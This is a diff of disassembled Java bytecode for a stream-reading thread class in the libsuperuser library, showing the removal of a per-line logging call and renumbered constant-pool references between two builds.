++ Program class: eu/chainfire/libsuperuser/d
   Superclass:    java/lang/Thread
   Major version: 0x32
   Minor version: 0x0
   Access flags:  0x21
-    = public class eu.chainfire.libsuperuser.e extends java.lang.Thread
+    = public class eu.chainfire.libsuperuser.d extends java.lang.Thread
 
 Interfaces (count = 0):
 
-Constant Pool (count = 65):
-  + String [[%s] %s]
-  + Class [eu/chainfire/libsuperuser/a]
-  + Class [eu/chainfire/libsuperuser/e]
+Constant Pool (count = 52):
+  + Class [eu/chainfire/libsuperuser/d]
   + Class [java/io/BufferedReader]
   + Class [java/io/IOException]
   + Class [java/io/InputStreamReader]
-  + Class [java/lang/Object]
   + Class [java/lang/String]
   + Class [java/lang/Thread]
   + Class [java/util/List]
-  + Fieldref [eu/chainfire/libsuperuser/e.a Ljava/lang/String;]
-  + Fieldref [eu/chainfire/libsuperuser/e.b Ljava/io/BufferedReader;]
-  + Fieldref [eu/chainfire/libsuperuser/e.c Ljava/util/List;]
-  + Methodref [eu/chainfire/libsuperuser/a.a (Ljava/lang/String;)V]
+  + Fieldref [eu/chainfire/libsuperuser/d.a Ljava/lang/String;]
+  + Fieldref [eu/chainfire/libsuperuser/d.b Ljava/io/BufferedReader;]
+  + Fieldref [eu/chainfire/libsuperuser/d.c Ljava/util/List;]
   + Methodref [java/io/BufferedReader.<init> (Ljava/io/Reader;)V]
   + Methodref [java/io/BufferedReader.close ()V]
   + Methodref [java/io/BufferedReader.readLine ()Ljava/lang/String;]
   + Methodref [java/io/InputStreamReader.<init> (Ljava/io/InputStream;)V]
-  + Methodref [java/lang/String.format (Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;]
   + Methodref [java/lang/Thread.<init> ()V]
   + InterfaceMethodref [java/util/List.add (Ljava/lang/Object;)Z]
   + NameAndType [<init> ()V]
   + NameAndType [<init> (Ljava/io/InputStream;)V]
   + NameAndType [<init> (Ljava/io/Reader;)V]
-  + NameAndType [a (Ljava/lang/String;)V]
   + NameAndType [a Ljava/lang/String;]
   + NameAndType [add (Ljava/lang/Object;)Z]
   + NameAndType [b Ljava/io/BufferedReader;]
   + NameAndType [c Ljava/util/List;]
   + NameAndType [close ()V]
-  + NameAndType [format (Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;]
   + NameAndType [readLine ()Ljava/lang/String;]
   + Utf8 [()Ljava/lang/String;]
   + Utf8 [()V]
   + Utf8 [(Ljava/io/InputStream;)V]
   + Utf8 [(Ljava/io/Reader;)V]
   + Utf8 [(Ljava/lang/Object;)Z]
-  + Utf8 [(Ljava/lang/String;)V]
   + Utf8 [(Ljava/lang/String;Ljava/io/InputStream;Ljava/util/List;)V]
-  + Utf8 [(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;]
   + Utf8 [<init>]
   + Utf8 [Code]
   + Utf8 [Ljava/io/BufferedReader;]
   + Utf8 [Ljava/lang/String;]
   + Utf8 [Ljava/util/List;]
   + Utf8 [StackMapTable]
-  + Utf8 [[%s] %s]
   + Utf8 [a]
   + Utf8 [add]
   + Utf8 [b]
   + Utf8 [c]
   + Utf8 [close]
-  + Utf8 [eu/chainfire/libsuperuser/a]
-  + Utf8 [eu/chainfire/libsuperuser/e]
-  + Utf8 [format]
+  + Utf8 [eu/chainfire/libsuperuser/d]
   + Utf8 [java/io/BufferedReader]
   + Utf8 [java/io/IOException]
   + Utf8 [java/io/InputStreamReader]
-  + Utf8 [java/lang/Object]
   + Utf8 [java/lang/String]
   + Utf8 [java/lang/Thread]
   + Utf8 [java/util/List]
@@ -50492,46 +50653,46 @@ Fields (count = 3):
 Methods (count = 2):
   - Method:       <init>(Ljava/lang/String;Ljava/io/InputStream;Ljava/util/List;)V
     Access flags: 0x1
-      = public e(java.lang.String,java.io.InputStream,java.util.List)
+      = public d(java.lang.String,java.io.InputStream,java.util.List)
     Class member attributes (count = 1):
     + Code attribute instructions (code length = 49, locals = 4, stack = 6):
       [0] aload_0 v0
-      [1] invokespecial #20
+      [1] invokespecial #15
         + Methodref [java/lang/Thread.<init> ()V]
       [4] aload_0 v0
       [5] aconst_null
-      [6] putfield #11
-        + Fieldref [eu/chainfire/libsuperuser/e.a Ljava/lang/String;]
+      [6] putfield #8
+        + Fieldref [eu/chainfire/libsuperuser/d.a Ljava/lang/String;]
       [9] aload_0 v0
       [10] aconst_null
-      [11] putfield #12
-        + Fieldref [eu/chainfire/libsuperuser/e.b Ljava/io/BufferedReader;]
+      [11] putfield #9
+        + Fieldref [eu/chainfire/libsuperuser/d.b Ljava/io/BufferedReader;]
       [14] aload_0 v0
       [15] aconst_null
-      [16] putfield #13
-        + Fieldref [eu/chainfire/libsuperuser/e.c Ljava/util/List;]
+      [16] putfield #10
+        + Fieldref [eu/chainfire/libsuperuser/d.c Ljava/util/List;]
       [19] aload_0 v0
       [20] aload_1 v1
-      [21] putfield #11
-        + Fieldref [eu/chainfire/libsuperuser/e.a Ljava/lang/String;]
+      [21] putfield #8
+        + Fieldref [eu/chainfire/libsuperuser/d.a Ljava/lang/String;]
       [24] aload_0 v0
-      [25] new #4
+      [25] new #2
         + Class [java/io/BufferedReader]
       [28] dup
-      [29] new #6
+      [29] new #4
         + Class [java/io/InputStreamReader]
       [32] dup
       [33] aload_2 v2
-      [34] invokespecial #18
+      [34] invokespecial #14
         + Methodref [java/io/InputStreamReader.<init> (Ljava/io/InputStream;)V]
-      [37] invokespecial #15
+      [37] invokespecial #11
         + Methodref [java/io/BufferedReader.<init> (Ljava/io/Reader;)V]
-      [40] putfield #12
-        + Fieldref [eu/chainfire/libsuperuser/e.b Ljava/io/BufferedReader;]
+      [40] putfield #9
+        + Fieldref [eu/chainfire/libsuperuser/d.b Ljava/io/BufferedReader;]
       [43] aload_0 v0
       [44] aload_3 v3
-      [45] putfield #13
-        + Fieldref [eu/chainfire/libsuperuser/e.c Ljava/util/List;]
+      [45] putfield #10
+        + Fieldref [eu/chainfire/libsuperuser/d.c Ljava/util/List;]
       [48] return
       Code attribute exceptions (count = 0):
       Code attribute attributes (attribute count = 0):
@@ -50539,71 +50700,52 @@ Methods (count = 2):
     Access flags: 0x1
       = public void run()
     Class member attributes (count = 1):
-    + Code attribute instructions (code length = 74, locals = 2, stack = 5):
+    + Code attribute instructions (code length = 51, locals = 2, stack = 2):
       [0] aconst_null
       [1] astore_1 v1
-      [2] goto +44 (target=46)
-      [5] ldc #1
-        + String [[%s] %s]
-      [7] iconst_2
-      [8] anewarray #7
-        + Class [java/lang/Object]
-      [11] dup
-      [12] iconst_0
-      [13] aload_0 v0
-      [14] getfield #11
-        + Fieldref [eu/chainfire/libsuperuser/e.a Ljava/lang/String;]
-      [17] aastore
-      [18] dup
-      [19] iconst_1
-      [20] aload_1 v1
-      [21] aastore
-      [22] invokestatic #19
-        + Methodref [java/lang/String.format (Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;]
-      [25] invokestatic #14
-        + Methodref [eu/chainfire/libsuperuser/a.a (Ljava/lang/String;)V]
-      [28] aload_0 v0
-      [29] getfield #13
-        + Fieldref [eu/chainfire/libsuperuser/e.c Ljava/util/List;]
-      [32] ifnull +14 (target=46)
-      [35] aload_0 v0
-      [36] getfield #13
-        + Fieldref [eu/chainfire/libsuperuser/e.c Ljava/util/List;]
-      [39] aload_1 v1
-      [40] invokeinterface #21
+      [2] goto +21 (target=23)
+      [5] aload_0 v0
+      [6] getfield #10
+        + Fieldref [eu/chainfire/libsuperuser/d.c Ljava/util/List;]
+      [9] ifnull +14 (target=23)
+      [12] aload_0 v0
+      [13] getfield #10
+        + Fieldref [eu/chainfire/libsuperuser/d.c Ljava/util/List;]
+      [16] aload_1 v1
+      [17] invokeinterface #16
         + InterfaceMethodref [java/util/List.add (Ljava/lang/Object;)Z]
-      [45] pop
-      [46] aload_0 v0
-      [47] getfield #12
-        + Fieldref [eu/chainfire/libsuperuser/e.b Ljava/io/BufferedReader;]
-      [50] invokevirtual #17
+      [22] pop
+      [23] aload_0 v0
+      [24] getfield #9
+        + Fieldref [eu/chainfire/libsuperuser/d.b Ljava/io/BufferedReader;]
+      [27] invokevirtual #13
         + Methodref [java/io/BufferedReader.readLine ()Ljava/lang/String;]
-      [53] dup
-      [54] astore_1 v1
-      [55] ifnonnull -50 (target=5)
-      [58] goto +4 (target=62)
-      [61] astore_1 v1
-      [62] aload_0 v0
-      [63] getfield #12
-        + Fieldref [eu/chainfire/libsuperuser/e.b Ljava/io/BufferedReader;]
-      [66] invokevirtual #16
+      [30] dup
+      [31] astore_1 v1
+      [32] ifnonnull -27 (target=5)
+      [35] goto +4 (target=39)
+      [38] astore_1 v1
+      [39] aload_0 v0
+      [40] getfield #9
+        + Fieldref [eu/chainfire/libsuperuser/d.b Ljava/io/BufferedReader;]
+      [43] invokevirtual #12
         + Methodref [java/io/BufferedReader.close ()V]
-      [69] goto +4 (target=73)
-      [72] astore_1 v1
-      [73] return
+      [46] goto +4 (target=50)
+      [49] astore_1 v1
+      [50] return
       Code attribute exceptions (count = 2):
-      - ExceptionInfo (0 -> 58: 61):
+      - ExceptionInfo (0 -> 35: 38):
       + Class [java/io/IOException]
-      - ExceptionInfo (62 -> 69: 72):
+      - ExceptionInfo (39 -> 46: 49):
       + Class [java/io/IOException]
       Code attribute attributes (attribute count = 1):
       + Stack map table attribute (count = 6):
         - [5] Var: ...[a:java/lang/String], Stack: (empty)
-        - [46] Var: ..., Stack: (empty)
-        - [61] Var: [a:eu/chainfire/libsuperuser/e], Stack: [a:java/io/IOException]
-        - [62] Var: ..., Stack: (empty)
-        - [72] Var: ..., Stack: [a:java/io/IOException]
-        - [73] Var: ..., Stack: (empty)
+        - [23] Var: ..., Stack: (empty)
+        - [38] Var: [a:eu/chainfire/libsuperuser/d], Stack: [a:java/io/IOException]
+        - [39] Var: ..., Stack: (empty)
+        - [49] Var: ..., Stack: [a:java/io/IOException]
+        - [50] Var: ..., Stack: (empty)
 
 Class file attributes (count = 0):
 
